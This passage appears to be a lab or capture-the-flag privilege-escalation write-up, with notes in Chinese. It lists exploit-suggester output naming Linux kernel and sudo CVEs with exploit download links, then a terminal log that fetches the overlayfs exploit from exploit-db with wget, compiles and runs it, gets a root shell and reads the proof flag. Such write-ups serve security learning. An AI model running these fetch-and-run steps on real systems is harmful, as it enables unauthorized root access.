   Tags: [ ubuntu=(14.04|15.10) ]{kernel:4.2.0-(18|19|20|21|22)-generic}
   Download URL: https://www.exploit-db.com/download/39166

[+] [CVE-2015-3202] fuse (fusermount)

   Details: http://seclists.org/oss-sec/2015/q2/520
   Exposure: probable
   Tags: debian=7.0|8.0,[ ubuntu=* ]
   Download URL: https://www.exploit-db.com/download/37089
   Comments: Needs cron or system admin interaction

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/39230

[+] [CVE-2014-5207] fuse_suid

   Details: https://www.exploit-db.com/exploits/34923/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/34923

[+] [CVE-2014-4014] inode_capable

   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4
   Exposure: less probable
   Tags: ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/33824

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                      
  [1] exploit_x                                                                                                              
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [2] overlayfs
      CVE-2015-8660
      Source: http://www.exploit-db.com/exploits/39230
  [3] pp_key
      CVE-2016-0728
      Source: http://www.exploit-db.com/exploits/39277
  [4] timeoutpwn
      CVE-2014-0038
      Source: http://www.exploit-db.com/exploits/31346

```
# 提權
## 每次用髒牛都把機器搞掛 所以換overlayfs
`https://vk9-sec.com/overlayfs-local-privilege-escalation-cve-2015-1328/`
```
┌──(root💀kali)-[/tmp]
└─# ssh overflow@192.168.0.16                                                                                          255 ⨯
overflow@192.168.0.16's password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Tue Apr 19 06:16:36 2022 from 192.168.0.30
Could not chdir to home directory /home/overflow: No such file or directory
$ cd /tmp
$ wget https://www.exploit-db.com/download/37292
--2022-04-19 06:22:18--  https://www.exploit-db.com/download/37292
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [application/txt]
Saving to: ‘37292’

100%[===================================================================================>] 5,119       --.-K/s   in 0s      

2022-04-19 06:22:20 (880 MB/s) - ‘37292’ saved [5119/5119]

$ ls
37292
$ ls -al
total 16
drwxrwxrwt  2 root     root     4096 Apr 19 06:22 .
drwxr-xr-x 21 root     root     4096 Aug  9  2014 ..
-rw-rw-r--  1 overflow overflow 5119 Apr 19 06:22 37292
$ mv 37292 37292.c
$ gcc 37292.c -o aaa
$ ./aaa
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# cd /root
# ls
proof.txt
# cat proof.txt
Good job, you did it! 


702a8c18d29c6f3ca0d99ef5712bfbdc
# 

```